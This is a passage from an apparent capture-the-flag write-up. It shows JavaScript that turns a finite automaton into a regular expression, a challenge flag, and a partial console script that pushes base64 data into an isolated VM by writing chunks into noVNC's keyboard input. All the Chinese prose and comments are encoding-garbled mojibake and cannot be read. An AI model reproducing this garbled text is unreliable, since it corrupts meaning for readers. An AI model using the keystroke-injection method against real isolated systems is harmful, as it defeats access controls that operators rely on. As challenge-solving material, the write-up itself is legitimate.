</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>b</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>b</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>b</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>n</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>n</span> <span class=o>&lt;</span> <span class=nx>base</span><span class=p>;</span> <span class=nx>n</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][(</span><span class=nx>i</span> <span class=o>*</span> <span class=nx>base</span> <span class=o>+</span> <span class=nx>n</span><span class=p>)</span> <span class=o>%</span> <span class=nx>b</span><span class=p>].</span><span class=nx>push</span><span class=p>(</span><span class=nx>n</span><span class=p>.</span><span class=nx>toString</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>b</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>b</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>=</span> <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>].</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=o>?</span> <span class=s1>&#39;[&#39;</span> <span class=o>+</span> <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>].</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;]&#39;</span> <span class=o>:</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>||</span> <span class=s1>&#39;phi&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>states</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// http://www.cs.umbc.edu/~squire/cs451_l7.html
</span></span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>reduce</span><span class=p>(</span><span class=nx>states</span><span class=p>,</span> <span class=nx>n</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=nx>states</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>reduced</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>s</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>j</span> <span class=o>&lt;</span> <span class=nx>s</span><span class=p>;</span> <span class=nx>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// reduced[i][j] = wrap(states[i][n] + wrap(states[n][n]) + &#39;*&#39; + states[n][j] + &#39;|&#39; + states[i][j]);
</span></span></span><span class=line><span class=cl>            <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;phi&#39;</span> <span class=o>||</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;phi&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>=</span> <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>!=</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>n</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;phi&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>==</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>==</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>==</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>]</span> <span class=o>||</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>==</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=s1>&#39;+&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span>
</span></span><span class=line><span class=cl>                    <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=s1>&#39;*&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>!=</span> <span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>n</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>+=</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>states</span><span class=p>[</span><span class=nx>n</span><span class=p>][</span><span class=nx>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>=</span> <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;phi&#39;</span> <span class=o>?</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>])</span> <span class=o>:</span> <span class=nx>alternate</span><span class=p>(</span><span class=nx>reduced</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>],</span> <span class=nx>states</span><span class=p>[</span><span class=nx>i</span><span class=p>][</span><span class=nx>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>reduced</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>matching</span><span class=p>(</span><span class=nx>x</span><span class=p>,</span> <span class=nx>open</span><span class=p>,</span> <span class=nx>close</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Test if the parens are actually matching
</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=s1>&#39;([&#39;</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>open</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=s1>&#39;)]&#39;</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>close</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=nx>open</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;=</span> <span class=nx>close</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=s1>&#39;([&#39;</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>i</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nx>count</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=s1>&#39;)]&#39;</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>i</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>count</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>count</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=nx>i</span> <span class=o>==</span> <span class=nx>close</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>x</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>2</span> <span class=o>||</span> <span class=nx>matching</span><span class=p>(</span><span class=nx>x</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>x</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;(&#39;</span> <span class=o>+</span> <span class=nx>x</span> <span class=o>+</span> <span class=s1>&#39;)&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>optional</span><span class=p>(</span><span class=nx>cond</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>matching</span><span class=p>(</span><span class=nx>cond</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>cond</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>op</span> <span class=o>=</span> <span class=nx>cond</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>cond</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>op</span> <span class=o>==</span> <span class=s1>&#39;+&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>cond</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;*&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>op</span> <span class=o>==</span> <span class=s1>&#39;*&#39;</span> <span class=o>||</span> <span class=nx>op</span> <span class=o>==</span> <span class=s1>&#39;?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>cond</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>matching</span><span class=p>(</span><span class=nx>cond</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>cond</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>optional</span><span class=p>(</span><span class=nx>cond</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>cond</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>alternate</span><span class=p>(</span><span class=nx>cond1</span><span class=p>,</span> <span class=nx>cond2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>cond2</span> <span class=o>=</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>cond2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>index</span> <span class=o>=</span> <span class=nx>cond1</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>cond2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>len</span> <span class=o>=</span> <span class=nx>cond2</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>cond</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>index</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>op</span> <span class=o>=</span> <span class=nx>cond1</span><span class=p>.</span><span class=nx>charAt</span><span class=p>(</span><span class=nx>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>op</span> <span class=o>==</span> <span class=s1>&#39;*&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>cond</span> <span class=o>=</span> <span class=nx>cond2</span> <span class=o>+</span> <span class=s1>&#39;+&#39;</span> <span class=o>+</span> <span class=nx>optional</span><span class=p>(</span><span class=nx>cond1</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=nx>len</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>op</span> <span class=o>==</span> <span class=s1>&#39;+&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>cond</span> <span class=o>=</span> <span class=nx>cond1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> 
</span></span><span class=line><span class=cl>            <span class=nx>cond</span> <span class=o>=</span> <span class=nx>cond2</span> <span class=o>+</span> <span class=nx>optional</span><span class=p>(</span><span class=nx>cond1</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=nx>len</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>index</span> <span class=o>==</span> <span class=nx>cond1</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=nx>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>cond</span> <span class=o>=</span> <span class=nx>optional</span><span class=p>(</span><span class=nx>cond1</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>index</span><span class=p>))</span> <span class=o>+</span> <span class=nx>cond2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>cond1</span><span class=p>.</span><span class=nx>length</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=nx>cond2</span><span class=p>.</span><span class=nx>length</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>cond</span> <span class=o>=</span> <span class=s1>&#39;[&#39;</span> <span class=o>+</span> <span class=nx>cond1</span> <span class=o>+</span> <span class=nx>cond2</span> <span class=o>+</span> <span class=s1>&#39;]&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nx>cond</span> <span class=o>=</span> <span class=nx>cond1</span> <span class=o>+</span> <span class=s1>&#39;|&#39;</span> <span class=o>+</span> <span class=nx>cond2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>wrap</span><span class=p>(</span><span class=nx>cond</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>regex</span> <span class=o>=</span> <span class=nx>gen</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>//regex (0+)? with 0*
</span></span></span><span class=line><span class=cl><span class=nx>regex</span> <span class=o>=</span> <span class=nx>regex</span><span class=p>.</span><span class=nx>toString</span><span class=p>().</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/\(0\+\)/g</span><span class=p>,</span> <span class=s1>&#39;0*&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>//remove head /^ and tail $/ before use
</span></span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>regex</span><span class=p>)</span>
</span></span></code></pre></div><pre tabindex=0><code>flag{pow3rful_r3gular_expressi0n_medium_b696342189}
</code></pre><h2 id=æ— æ³•è·å¾—çš„ç§˜å¯†>æ— æ³•è·å¾—çš„ç§˜å¯†<a hidden class=anchor aria-hidden=true href=#æ— æ³•è·å¾—çš„ç§˜å¯†>#</a></h2><p>vmåªèƒ½ç”¨novncè®¿é—®ï¼Œå¹¶ä¸”ä¸èƒ½æ‹–æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½å…±äº«å‰ªè´´æ¿ï¼Œè¯»å–ä¿¡æ¯ä¹Ÿåªèƒ½é€šè¿‡å±å¹•ï¼Œå†™å…¥ä¿¡æ¯åªèƒ½é€šè¿‡é”®ç›˜è¾“å…¥å’Œé¼ æ ‡ã€‚é¦–å…ˆæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹å¦‚ä½•åˆ©ç”¨vmé‡Œå·²æœ‰çš„è½¯ä»¶ã€‚ç»è¿‡è§‚å¯Ÿï¼Œé™¤äº†å¸¸è§çš„å‘½ä»¤è¡Œè½¯ä»¶ï¼Œè¿™ä¸ªæœºå™¨é‡Œæœ‰pythonï¼Œä¹Ÿæœ‰æµè§ˆå™¨ï¼ˆæ„å‘³ç€è‡³å°‘èƒ½è¿è¡Œpythonå’Œjavascriptä»£ç ï¼‰ã€‚</p><p>ç¬”è€…åœ¨å‡ å‘¨å‰æ­£å¥½çœ‹åˆ°è¿‡ä¸€ä½å¼€å‘è€…å¼€å‘è¿‡ä¸€ä¸ªåä¸º<a href=https://github.com/qifi-dev/qrs>qrs</a>çš„ã€Œç½‘é¡µä¼ è¾“æ•°æ®ã€çš„åŒ…ã€‚è¿™ä¸ªåŒ…é€šè¿‡æŠŠæ–‡ä»¶ç¼–ç è¿›äºŒç»´ç ï¼Œç„¶åç”¨å–·æ³‰ç çš„æ–¹å¼æŠŠäºŒç»´ç æ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ¥è®©å±å¹•å¦ä¸€è¾¹çš„ã€Œå®¢æˆ·ç«¯ã€æ”¶å–ä¿¡æ¯ã€‚ç¬”è€…éšå³å°è¯•æŠŠqrsçš„ç½‘é¡µç¼–è¯‘å‡ºæ¥ï¼Œå»æ‰äº†å›¾ç‰‡ï¼ˆå‡å°ä½“ç§¯ï¼‰ï¼Œå‹ç¼©åbase64ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nv>GZIP</span><span class=o>=</span>-9  tar -czvf public.tar.gz public
</span></span><span class=line><span class=cl>base64 -i public.tar.gz &gt; public_b64.txt
</span></span></code></pre></div><pre tabindex=0><code>156K Nov  2 20:33 public.tar.gz
209K Nov  2 20:33 public_b64.txt
</code></pre><p>è¿™æ—¶è¿™ä¸ªbase64åçš„æ–‡ä»¶å¤§æ¦‚æœ‰209kï¼ˆå¤§æ¦‚20å¤šä¸‡ä¸ªå­—ç¬¦ï¼‰ï¼Œå¦‚æœæ‹¿é”®ç›˜å®è¾“å…¥çš„è¯æ¯ç§’çš„è¾“å…¥é€Ÿåº¦å¤§æ¦‚è¦åˆ°300å¤šä¸ªå­—ç¬¦ï¼Œè¿™æ˜¯æ­£å¸¸çš„é”®ç›˜å®åšä¸åˆ°çš„ã€‚</p><p>éšåç¬”è€…æ³¨æ„åˆ°æˆ‘å¯ä»¥ç›´æ¥å¾€<code>noVNC_keyboardinput</code>é‡Œå†™å…¥æ•°æ®å†å‘é€ï¼Œåœ¨ä¿è¯novncä¸å¡æ­»çš„æƒ…å†µä¸‹ï¼Œå¤§æ¦‚æ¯æ¬¡èƒ½å‘é€1ä¸‡ä¸ªå­—ç¬¦ï¼ˆä¸¤æ¬¡å‘é€ä¹‹é—´æœ€å¥½éš”10ç§’å·¦å³ï¼Œè®©ç¼“å†²åŒºé‡Œçš„è¾“å…¥èƒ½å¤Ÿå®Œå…¨æ‰§è¡Œï¼‰ï¼Œå› æ­¤åœ¨llmçš„è¾…åŠ©ä¸‹å†™äº†ä»¥ä¸‹çš„ä¼ è¾“jsï¼ˆç²˜è´´è¿›æµè§ˆå™¨çš„consoleå³å¯ä½¿ç”¨ï¼‰</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>appendToFile</span><span class=p>(</span><span class=nx>text</span><span class=p>,</span> <span class=nx>chunkSize</span> <span class=o>=</span> <span class=mi>10000</span><span class=p>,</span> <span class=nx>pauseDuration</span> <span class=o>=</span> <span class=mi>10000</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>input</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;noVNC_keyboardinput&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>input</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s2>&#34;æ‰¾ä¸åˆ°é”®ç›˜è¾“å…¥å…ƒç´ &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// è®¡ç®—æ€»å—æ•°
